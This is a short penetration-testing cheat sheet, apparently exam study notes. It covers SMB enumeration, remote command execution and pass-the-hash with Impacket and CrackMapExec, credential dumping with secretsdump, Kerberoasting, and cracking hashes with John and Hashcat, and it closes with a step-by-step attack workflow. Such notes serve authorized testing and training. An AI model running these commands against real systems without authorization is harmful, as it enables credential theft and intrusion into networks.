SMB Enumeration

smbclient:

smbclient -L //target_ip -N
smbclient //target_ip/share -N
get file
put file

smbmap:

smbmap -H target_ip
smbmap -H target_ip -u user -p password -r

enum4linux:

enum4linux -a target_ip
CrackMapExec / NetExec
crackmapexec smb target_ip
crackmapexec smb target_ip -u user -p password
crackmapexec smb target_ip -u users.txt -p password
crackmapexec smb target_ip -u user -p password --shares
crackmapexec smb target_ip -u user -p password -x "whoami"
Impacket Suite
impacket-psexec user:password@target_ip
impacket-wmiexec user:password@target_ip
impacket-smbexec user:password@target_ip

impacket-psexec -hashes LM:NT user@target_ip
impacket-secretsdump user:password@target_ip

impacket-GetNPUsers domain/ -usersfile users.txt -no-pass
impacket-GetUserSPNs domain/user:password -request

John & Hashcat

John:

john hash.txt --wordlist=rockyou.txt
john --show hash.txt
zip2john file.zip > hash.txt
ssh2john id_rsa > hash.txt
keepass2john db.kdbx > hash.txt
pdf2john file.pdf > hash.txt

Hashcat:

hashcat -m 1000 hash.txt rockyou.txt

Practical Workflow (Exam Mental Model)
  1. Enumerate SMB → smbclient / enum4linux / smbmap
  2. Validate creds → crackmapexec
  3. Execute commands → impacket / evil-winrm
  4. Dump creds → mimikatz / secretsdump
  5. AD pivot → bloodhound / powerview
  6. Web → fuzz → exploit (ffuf, gobuster)
  7. Bruteforce if needed → hydra
  8. Crack hashes → john / hashcat
